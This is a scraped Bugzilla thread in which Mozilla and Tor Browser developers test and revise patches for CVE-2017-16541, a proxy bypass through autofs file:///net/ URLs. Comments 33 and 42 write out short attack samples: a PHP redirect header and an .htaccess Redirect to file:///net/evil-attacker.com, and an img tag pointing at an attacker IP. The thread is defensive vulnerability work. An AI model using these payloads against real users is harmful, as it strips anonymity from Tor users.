                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a93004_75935">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a93004_75935">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 14:15 PDT" data-time="1509138938">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox56&amp;o1=isnotempty">status-firefox56</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox56&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox57&amp;o1=isnotempty">status-firefox57</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox57&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox58&amp;o1=isnotempty">status-firefox58</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox58&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr52&amp;o1=isnotempty">status-firefox-esr52</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr52&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox57&amp;o1=isnotempty">tracking-firefox57</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox57&amp;o1=equals&amp;v1=%3F">?</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox58&amp;o1=isnotempty">tracking-firefox58</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox58&amp;o1=equals&amp;v1=%3F">?</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr52&amp;o1=isnotempty">tracking-firefox-esr52</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox_esr52&amp;o1=equals&amp;v1=%3F">?</a></div></div></div><div class="change-set" id="c30"><div class="comment" data-id="12797470" data-no="30"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-30" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_474980" id="a93004_75935"><img src="https://secure.gravatar.com/avatar/dfcd4ae2df9a810044e19c011304881e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_474980" id="a93004_75935"><a class="email " href="/user_profile?user_id=474980" > <span class="fna">Arthur Edelstein [:arthur]</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-30"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-30" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c30">Comment 30</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 18:04 PDT" data-time="1509152654">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-30">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-30" data-comment-id="12797470">(In reply to Georg Koppen from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c25">comment #25</a>)
<span class="quote">&gt; (In reply to Mark Smith (:mcs) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c18">comment #18</a>)
&gt; &gt; I am not sure, but it might work to add the check suggested by Christoph to
&gt; &gt; nsFileProtocolHandler::NewChannel2().
&gt; 
&gt; Partly, yes. The problems is that we hit the newChannel() call in
&gt; `nsIOService::NewChannelFromURIWithProxyFlagsInternal()` without loadFlags.
&gt; I guess what we can do is do just return an error in our case if we hit that
&gt; part. I've implemented that in a patch and I don't see the proxy bypass on
&gt; my Linux box anymore. mcs/arthur: could you verify that on OS X as well (see
&gt; the attached patch; I could not give its final version a test yet as I blew
&gt; my build away accidentally and need to make a full new one but am about to
&gt; be afk)? Is there anything we'd blow up by deploying this workaround?</span >

I built Tor Browser alpha (based on ESR52) without and with the patch (23447a7a1b0), for OS X, and tested it as before. I can confirm that the patch stops the proxy bypass for both the CSS and &lt;image&gt; cases. I have also browsed to several sites with the patched version and didn't run into any problems.

Here are my branches:
<a rel="nofollow" href="https://github.com/arthuredelstein/tor-browser-build/commit/1412081">https://github.com/arthuredelstein/tor-browser-build/commit/1412081</a>
<a rel="nofollow" href="https://github.com/arthuredelstein/tor-browser/commit/1412081">https://github.com/arthuredelstein/tor-browser/commit/1412081</a>

Here are my builds in case anyone wants to try it:
<a rel="nofollow" href="https://arthuredelstein.net/stuff/1412081">https://arthuredelstein.net/stuff/1412081</a>

And I applied the patch to the latest Firefox ESR52 and pushed to try. We'll see how it goes:
<a rel="nofollow" href="https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=6c475d223e9433df14c2728e7e1641b659b698be">https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=6c475d223e9433df14c2728e7e1641b659b698be</a></pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(arthuredelstein)</span></div></div></div><div class="change-set" id="c31"><div class="comment" data-id="12797608" data-no="31"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-31" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_474980" id="a93004_75935"><img src="https://secure.gravatar.com/avatar/dfcd4ae2df9a810044e19c011304881e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_474980" id="a93004_75935"><a class="email " href="/user_profile?user_id=474980" > <span class="fna">Arthur Edelstein [:arthur]</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-31"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-31" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c31">Comment 31</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 21:31 PDT" data-time="1509165084">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-31">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-31" data-comment-id="12797608">(In reply to Arthur Edelstein (Tor Browser dev) [:arthuredelstein] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c30">comment #30</a>)

<span class="quote">&gt; And I applied the patch to the latest Firefox ESR52 and pushed to try. We'll
&gt; see how it goes:
&gt; <a rel="nofollow" href="https://treeherder.mozilla.org/#/">https://treeherder.mozilla.org/#/</a>
&gt; jobs?repo=try&amp;revision=6c475d223e9433df14c2728e7e1641b659b698be</span >

A lot of test failures turned up, so I am running the negative control (same branch minus the patch) to see which failures we can attribute to the patch:

<a rel="nofollow" href="https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=feaa5cdb3ccb">https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=feaa5cdb3ccb</a></pre></div><div class="change-set" id="c32"><div class="comment" data-id="12798334" data-no="32"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-32" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a93004_75935"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a93004_75935"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-32"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-32" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c32">Comment 32</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-28 18:16 PDT" data-time="1509239797">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-32">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-32" data-comment-id="12798334">(In reply to Georg Koppen from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c29">comment #29</a>)
<span class="quote">&gt; Dan, would it be okay if we released a new Tor Browser with a functional
&gt; workaround before this bugs gets fixed properly</span >

Please do!</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(dveditz)</span></div></div></div><div class="change-set" id="c33"><div class="comment" data-id="12806370" data-no="33"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-33" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a93004_75935"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a93004_75935"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-33"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-33" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c33">Comment 33</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-31 12:48 PDT" data-time="1509479315">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-33">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-33" data-comment-id="12806370">Okay, we were about to release Tor Browser 7.0.9 with the attached workaround today but Filippo and Nicolas found ways to bypass it. So we stopped.

I don't have a URL handy to test for those new attack vectors but they seem to involve redirect mechanisms. Just pointing a victim to a php file containing:

&lt;?php
header(&quot;Location: file:///net/evil-attacker.com/a.css&quot;);
?&gt;

is supposed to be enough or creating an .htaccess file with the line

Redirect / file:///net/11.11.11.14/a.css</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(mcs)</span></div></div></div><div class="change-set" id="c34"><div class="comment" data-id="12807692" data-no="34"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-34" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a93004_75935"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a93004_75935"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-34"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-34" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c34">Comment 34</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-31 23:34 PDT" data-time="1509518047">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-34">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-34" data-comment-id="12807692">The problem seems to be that the codebase principal check is failing in the redirect case. Christoph: Do we have a different check we could use for both redirect/non-redirect cases? Just using the triggering principal one and preventing channel creation in that case already seems to be the nuclear option as it makes file:// unusable.</pre><div class="activity"><div class="change">Flags: needinfo?(ckerschb)</div></div></div><div class="change-set" id="c35"><div class="comment" data-id="12807705" data-no="35"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-35" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a93004_75935"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a93004_75935"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-35"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-35" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c35">Comment 35</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-31 23:43 PDT" data-time="1509518586">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-35">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-35" data-comment-id="12807705">Honza: Or maybe we could/should do something else for the redirect case?</pre><div class="activity"><div class="change">Flags: needinfo?(honzab.moz)</div></div></div><div class="change-set" id="c36"><div class="comment" data-id="12808136" data-no="36"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-36" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_474980" id="a93004_75935"><img src="https://secure.gravatar.com/avatar/dfcd4ae2df9a810044e19c011304881e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_474980" id="a93004_75935"><a class="email " href="/user_profile?user_id=474980" > <span class="fna">Arthur Edelstein [:arthur]</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-36"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-36" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c36">Comment 36</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-01 03:42 PDT" data-time="1509532922">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-36">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-36" data-comment-id="12808136">I made a patch that blocks redirects from http(s) to file:// URIs. I'm not sure if it's the ideal approach, but I think it might be a reasonable stopgap for Tor Browser:
<a rel="nofollow" href="https://github.com/arthuredelstein/tor-browser/commit/1412081_redirect">https://github.com/arthuredelstein/tor-browser/commit/1412081_redirect</a>

Here's the build:
<a rel="nofollow" href="https://arthuredelstein.net/stuff/1412081/TorBrowser-7.5a6-osx64_en-US_redirect_patch.dmg">https://arthuredelstein.net/stuff/1412081/TorBrowser-7.5a6-osx64_en-US_redirect_patch.dmg</a>
<a rel="nofollow" href="https://arthuredelstein.net/stuff/1412081/TorBrowser-7.5a6-osx64_en-US_redirect_patch.dmg.asc">https://arthuredelstein.net/stuff/1412081/TorBrowser-7.5a6-osx64_en-US_redirect_patch.dmg.asc</a>

(Note this doesn't include Georg's other patch. Both patches will be needed to block everything.)</pre></div><div class="change-set" id="a491926_269762"><div class="change" id="aa491926_269762">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_269762" id="a491926_269762"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_269762" id="a491926_269762"><a class="email " href="/user_profile?user_id=269762" > <span class="fna">Honza Bambas (:mayhemer)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a491926_269762"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a491926_269762">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a491926_269762">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-01 05:04 PDT" data-time="1509537860">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(honzab.moz)</span></div></div></div><div class="change-set" id="c37"><div class="comment" data-id="12808266" data-no="37"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-37" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_32546" id="a491926_269762"><img src="https://secure.gravatar.com/avatar/2b0de973c803f192309b00777c594202?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_32546" id="a491926_269762"><a class="email " href="/user_profile?user_id=32546" > <span class="fna">Patrick McManus [:mcmanus]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-37"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-37" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c37">Comment 37</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-01 05:16 PDT" data-time="1509538610">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-37">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-37" data-comment-id="12808266">Dan, under what circumstances do we want to allow an http redirect to a file? I can't think of any off the top of my head (and didn't think we ever allowed it.. but apparently that's not true.). We can certainly block it right in the http channel code if there isn't some use case to support..</pre></div><div class="change-set" id="c38"><div class="comment" data-id="12808460" data-no="38"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-38" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_269762" id="a491926_269762"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_269762" id="a491926_269762"><a class="email " href="/user_profile?user_id=269762" > <span class="fna">Honza Bambas (:mayhemer)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-38"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-38" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c38">Comment 38</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-01 06:47 PDT" data-time="1509544059">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-38">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-38" data-comment-id="12808460">A simple test showed that we as expected block http-&gt;file redirects.  For a quick fix we could add the simple schema check as suggested in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c36">comment 36</a> to prevent creation of the file channel.

I can't think of a general check from the top of my head to do checkmayload checks prior we do stat() on the file.</pre></div><div class="change-set" id="c39"><div class="comment" data-id="12808699" data-no="39"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-39" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_435321" id="a491926_269762"><img src="https://secure.gravatar.com/avatar/8488539254ab196fb786c038cd86af5e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_435321" id="a491926_269762"><a class="email " href="/user_profile?user_id=435321" > <span class="fna">Nicolas Vigier</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-39"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-39" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c39">Comment 39</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-01 08:23 PDT" data-time="1509549798">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-39">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-39" data-comment-id="12808699">(In reply to Arthur Edelstein (Tor Browser dev) [:arthuredelstein] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c36">comment #36</a>)
<span class="quote">&gt; I made a patch that blocks redirects from http(s) to file:// URIs. I'm not
&gt; sure if it's the ideal approach, but I think it might be a reasonable
&gt; stopgap for Tor Browser:
&gt; <a rel="nofollow" href="https://github.com/arthuredelstein/tor-browser/commit/1412081_redirect">https://github.com/arthuredelstein/tor-browser/commit/1412081_redirect</a></span >

I confirm this patch is fixing the redirect to file:// issue in a Linux build for me:
<a rel="nofollow" href="https://people.torproject.org/~boklm/p/1412081_redirect/tor-browser-linux64-7.5a7_en-US.tar.xz">https://people.torproject.org/~boklm/p/1412081_redirect/tor-browser-linux64-7.5a7_en-US.tar.xz</a>
<a rel="nofollow" href="https://people.torproject.org/~boklm/p/1412081_redirect/tor-browser-linux64-7.5a7_en-US.tar.xz.asc">https://people.torproject.org/~boklm/p/1412081_redirect/tor-browser-linux64-7.5a7_en-US.tar.xz.asc</a></pre></div><div class="change-set" id="c40"><div class="comment" data-id="12808838" data-no="40"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-40" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_4418" id="a491926_269762"><img src="https://secure.gravatar.com/avatar/4febbd86c096511a281d5921a0fd3824?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_4418" id="a491926_269762"><a class="email " href="/user_profile?user_id=4418" > <span class="fna">Mark Smith [:mcs]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-40"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-40" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c40">Comment 40</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-01 09:08 PDT" data-time="1509552532">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-40">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-40" data-comment-id="12808838">At first I had trouble reproducing the HTTP redirect problem. For some reason the problem does occur reliably in the first/default tab in Tor Browser 7.0.x but I can always reproduce it in a new tab. Now I can confirm that the patch from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c36">comment #36</a> closes the HTTP redirect hole on macOS.

I wonder if there are other similar holes that need to be closed. Script-based techniques such as setting document.location seem to be caught early by existing code that calls ssm-&gt;CheckLoadURIFromScript(). I tried using a file:///net/... URL as the src for an &lt;iframe&gt; but that is also blocked early by existing code. I don't think FTP supports redirect to an arbitrary URL. Can anyone think of other protocols or techniques within HTTP or HTML that we should examine? I don't know what netwerk/protocol/gio does but at least that is not included in ESR52 (so it is not an immediate concern for Tor Browser).</pre></div><div class="change-set" id="c41"><div class="comment" data-id="12808843" data-no="41"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-41" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_4418" id="a491926_269762"><img src="https://secure.gravatar.com/avatar/4febbd86c096511a281d5921a0fd3824?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_4418" id="a491926_269762"><a class="email " href="/user_profile?user_id=4418" > <span class="fna">Mark Smith [:mcs]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-41"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-41" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c41">Comment 41</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-01 09:11 PDT" data-time="1509552680">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-41">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-41" data-comment-id="12808843">(In reply to Mark Smith (:mcs) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c40">comment #40</a>)
<span class="quote">&gt; At first I had trouble reproducing the HTTP redirect problem. For some
&gt; reason the problem does occur reliably in the first/default tab in Tor
&gt; Browser 7.0.x ....</span >

I meant to say &quot;For some reason the problem does NOT occur reliably...&quot; Sorry!</pre></div><div class="change-set" id="c42"><div class="comment" data-id="12809224" data-no="42"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-42" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_474980" id="a491926_269762"><img src="https://secure.gravatar.com/avatar/dfcd4ae2df9a810044e19c011304881e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_474980" id="a491926_269762"><a class="email " href="/user_profile?user_id=474980" > <span class="fna">Arthur Edelstein [:arthur]</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-42"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-42" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c42">Comment 42</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-01 11:04 PDT" data-time="1509559462">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-42">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-42" data-comment-id="12809224">A couple of much weaker attacks I noticed:
1. The user could be induced to past file:///net/11.11.11.14/a.css into the URL bar
2. Open an html page with &lt;img src=&quot;file:///net/11.11.11.14/a.jpg&quot;&gt;. Now choose Page Info, click on the item for the fake image, click &quot;Save As&quot; and choose a location to save the file.

#1 is perhaps a concern. For #1 the most promising fix I can think of is to blacklist URLs of the form &quot;file:///net/*&quot;.

#2 seems unlikely to be a very useful attack vector, but perhaps it would be good to fix as well.</pre></div><div class="change-set" id="c43"><div class="comment" data-id="12809917" data-no="43"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-43" role="presentation">
      <tr>
